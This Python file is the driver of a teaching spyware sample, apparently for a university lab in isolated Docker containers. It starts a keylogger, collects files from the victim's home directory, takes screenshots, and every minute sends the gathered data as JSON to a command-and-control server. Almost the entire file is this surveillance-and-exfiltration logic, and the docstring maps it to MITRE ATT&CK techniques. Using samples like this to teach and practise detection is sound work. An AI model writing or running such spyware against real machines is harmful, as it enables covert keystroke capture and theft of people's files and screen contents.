# GHOST-IN-THE-BOX LAB — EDUCATIONAL SAMPLE
# Round: 1 | Isolated Docker environment only
# For use in university cybersecurity courses
# MITRE ATT&CK: T1056.001, T1113, T1005, T1071.001, T1041
"""R1 naïve spyware.

Collection: keylogger (X11), ~$HOME file harvest, screenshot (scrot).
Exfil:      HTTP POST plaintext JSON to c2-server:8080 every 60s.
Evasion:    NONE. Process name, open sockets, and C2 URL are all visible.
Persistence: NONE (R1 is a one-shot foreground process).

Runs as the `analyst` user inside the victim container. See zadania.md for
the red-team walkthrough students follow.
"""
import os
import time
from pathlib import Path

# Shared modules live in /opt/spyware/shared inside the container; the Dockerfile
# sets PYTHONPATH so these imports resolve without package qualification.
import collector
import exfil_http

from generators.data import scenario_facts as sf


def _build_payload(keys: list[str], files: dict, screenshot_path: Path) -> dict:
    screenshot_bytes_len = (
        screenshot_path.stat().st_size if screenshot_path.exists() else 0
    )
    return {
        "host": sf.VICTIM_HOSTNAME,
        "user": sf.VICTIM_USERNAME,
        "ts_epoch": int(time.time()),
        "keys": keys,
        "files": files,
        "screenshot_bytes": screenshot_bytes_len,
    }


def main() -> None:
    home = Path(os.path.expanduser(f"~{sf.VICTIM_USERNAME}"))
    screenshot_dir = Path(sf.SCREENSHOT_DIR)
    screenshot_dir.mkdir(exist_ok=True)

    keylogger = collector.Keylogger()
    keylogger.start()

    client = exfil_http.HttpExfilClient()

    try:
        while True:
            time.sleep(sf.EXFIL_INTERVAL_SECONDS)

            keys = keylogger.flush()
            files = collector.harvest_files(home, sf.STOLEN_FILES)
            shot = screenshot_dir / f"screen-{int(time.time())}.png"
            collector.take_screenshot(shot)

            payload = _build_payload(keys, files, shot)
            client.send(payload)
    finally:
        keylogger.stop()


if __name__ == "__main__":
    main()
